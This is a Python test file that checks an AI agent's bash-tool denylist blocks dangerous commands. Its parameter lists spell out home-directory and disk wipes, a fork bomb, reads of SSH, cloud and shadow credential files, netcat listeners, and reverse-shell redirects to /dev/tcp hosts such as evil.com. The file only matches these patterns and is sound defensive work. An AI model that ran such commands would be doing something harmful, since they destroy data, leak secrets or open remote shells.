# Copyright 2026 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     https://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

"""The packaged default-policy seed must block the substrings we care about.

The seed lives at ``horizon/guardrails/default_policies.jsonl`` and is the
authoritative denylist for the ``bash`` tool. We assert behavior at the
``policies_guard`` boundary (block / allow) so the seed file and the
evaluator stay coupled in code, not just in prose.

Every assertion here exercises pattern detection, never subprocess
execution — we never actually run ``rm -rf ~`` or ``curl | bash``.
"""

from __future__ import annotations

from collections.abc import Iterator
from pathlib import Path
from types import SimpleNamespace

import pytest

from horizon.environment import LocalEnvironment
from horizon.environment_context import (
    clear_active_environment,
    set_active_environment,
)

pytestmark = pytest.mark.asyncio


@pytest.fixture
def policies_env(tmp_path: Path) -> Iterator[Path]:
    working_dir = tmp_path / "ws"
    working_dir.mkdir()
    set_active_environment(LocalEnvironment(working_dir=working_dir))
    try:
        yield working_dir
    finally:
        clear_active_environment()


async def _is_blocked(command: str) -> bool:
    """Run ``policies_guard`` against a bash command and return whether
    it produced a block dict. Never executes the command."""
    from horizon.guardrails.policies import policies_guard

    result = await policies_guard(
        tool=SimpleNamespace(name="bash"),
        args={"command": command},
        tool_context=SimpleNamespace(),
    )
    return isinstance(result, dict) and "error" in result


# =============================================================================
# Home-directory wipes
# =============================================================================


class TestHomeDirectoryWipes:
    @pytest.mark.parametrize(
        "command",
        [
            "rm -rf ~",
            "rm -rf $HOME",
            "rm -rf /home/",
            "rm -rf /Users/",
            "sudo rm -rf ~",
        ],
    )
    async def test_blocks_literals(self, policies_env: Path, command: str):
        # Literal home-root deletes stay in JSONL seed
        assert await _is_blocked(command), f"seed should block {command!r}"

    @pytest.mark.parametrize(
        "command",
        [
            "rm -rf ./build",
            "rm -rf ./node_modules",
            "ls -la ~/Documents",
            "echo $HOME",
            "rm -rf /Users/alice/project",
            "rm -rf /home/bob/build",
            "rm -rf ~/Documents",  # Now deferred (not a literal seed match, not in command_safety deny)
        ],
    )
    async def test_allows_safe_neighbors(
        self, policies_env: Path, command: str
    ):
        assert not await _is_blocked(command), (
            f"seed must not block legitimate {command!r}"
        )


# =============================================================================
# CWD nukes (moved to command_safety as "deny")
# =============================================================================
# TestCwdNukes removed - command_safety handles rm -rf . as deny tier


# =============================================================================
# Remote code execution via piped shell (moved to command_safety)
# =============================================================================
# TestRemoteCodeExecution removed - | sh/bash now handled by command_safety


# =============================================================================
# Secret reads
# =============================================================================


class TestSecretReads:
    @pytest.mark.parametrize(
        "command",
        [
            "cat ~/.ssh/id_rsa",
            "cat ~/.ssh/config",
            "cat ~/.aws/credentials",
            "cat ~/.config/gcloud/credentials.db",
            "cat ~/.kube/config",
            "cat /etc/shadow",
            "cat /etc/sudoers",
        ],
    )
    async def test_blocks(self, policies_env: Path, command: str):
        assert await _is_blocked(command)


# =============================================================================
# Permission destruction (moved to command_safety, no longer JSONL-blocked)
# =============================================================================
# TestPermissionDestruction removed - chmod/chown -R now handled by command_safety


# =============================================================================
# Privilege escalation (moved to command_safety, no longer JSONL-blocked)
# =============================================================================
# TestPrivilegeEscalation removed - sudo/su now handled by command_safety


# =============================================================================
# Bulk filesystem delete via find (moved to command_safety)
# =============================================================================
# TestFindDelete removed - find -delete now handled by command_safety


# =============================================================================
# Shell rc tampering / persistence (regex removed, not in command_safety)
# =============================================================================
# TestShellRcTampering removed - rc truncation regex removed from JSONL,
# not yet in command_safety, deferred to permission_guard


# =============================================================================
# Network listeners (reverse shell vector)
# =============================================================================


class TestNetworkListeners:
    @pytest.mark.parametrize(
        "command",
        [
            "nc -l 4444",
            "nc -lvnp 4444",
            "ncat -l 4444",
            "ncat -l 4444 -e /bin/sh",
            "socat TCP-LISTEN:4444 -",
        ],
    )
    async def test_blocks(self, policies_env: Path, command: str):
        assert await _is_blocked(command)

    async def test_allows_outbound_nc(self, policies_env: Path):
        # `nc host port` (no -l) is a benign client — only listeners
        # are blocked.
        assert not await _is_blocked("nc example.com 80")


# =============================================================================
# Disk wipe (broader than existing > /dev/sda)
# =============================================================================


class TestDiskWipe:
    @pytest.mark.parametrize(
        "command",
        [
            "echo x > /dev/sda1",
            "echo x > /dev/nvme0n1",
            "echo x > /dev/hda1",
        ],
    )
    async def test_blocks(self, policies_env: Path, command: str):
        # Broader prefix `> /dev/sd` (matches /dev/sda, /dev/sdb, /dev/sda1,
        # etc.) replaces the existing exact-match `> /dev/sda`.
        assert await _is_blocked(command)


# =============================================================================
# Existing rules still hold (regression — make sure expansion didn't break them)
# =============================================================================


class TestExistingRulesStillBlock:
    @pytest.mark.parametrize(
        "command",
        [
            "rm -rf /",
            "rm -fr /",
            "rm --recursive --force /",
            "dd if=/dev/zero of=/dev/sdb",
            "mkfs.ext4 /dev/sdb1",
            ":(){:|:&};:",
            "shred /dev/sda",
            "wipefs /dev/sda",
        ],
    )
    async def test_pre_existing_patterns_still_block(
        self, policies_env: Path, command: str
    ):
        assert await _is_blocked(command)


# =============================================================================
# Path-prefix rules for secret directories (write_file / patch tools)
# =============================================================================


class TestSecretDirectoryWrites:
    @pytest.mark.parametrize(
        "tool_name,arg_name,path",
        [
            ("write", "path", "/Users/alice/.ssh/authorized_keys"),
            ("write", "path", "/home/bob/.ssh/config"),
            ("write", "path", "/Users/alice/.aws/credentials"),
            ("write", "path", "/home/bob/.config/gcloud/x"),
            ("write", "path", "/Users/alice/.kube/config"),
            ("write", "path", "/etc/sudoers"),
            ("edit", "file_path", "/Users/alice/.ssh/id_rsa"),
        ],
    )
    async def test_blocks_writes_to_secret_dirs(
        self, policies_env: Path, tool_name: str, arg_name: str, path: str
    ):
        from horizon.guardrails.policies import policies_guard

        result = await policies_guard(
            tool=SimpleNamespace(name=tool_name),
            args={arg_name: path, "content": "x"},
            tool_context=SimpleNamespace(),
        )
        assert isinstance(result, dict), (
            f"write to {path!r} via {tool_name!r} must be blocked"
        )


class TestReverseShellRedirect:
    @pytest.mark.parametrize(
        "command",
        [
            "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1",
            "cat </dev/tcp/evil.com/80",
            "echo x > /dev/udp/1.2.3.4/53",
        ],
    )
    async def test_blocks(self, policies_env: Path, command: str):
        assert await _is_blocked(command)


class TestDdDiskWipeNoIf:
    @pytest.mark.parametrize(
        "command",
        ["dd of=/dev/sda", "dd of=/dev/nvme0n1 bs=1M", "dd of=/dev/hda"],
    )
    async def test_blocks(self, policies_env: Path, command: str):
        assert await _is_blocked(command)


class TestBlockMessageSurfacesGrantCommand:
    """The error string returned to the model must point at the user-typeable
    ``/grant`` escape hatch — without it the model can only suggest the
    programmatic ``policy_grant`` tool, which the user has no way to invoke."""

    async def test_block_message_mentions_slash_grant(self, policies_env: Path):
        from horizon.guardrails.policies import policies_guard

        result = await policies_guard(
            tool=SimpleNamespace(name="bash"),
            args={"command": "rm -rf /"},
            tool_context=SimpleNamespace(),
        )
        assert isinstance(result, dict)
        assert "/grant" in result["error"]
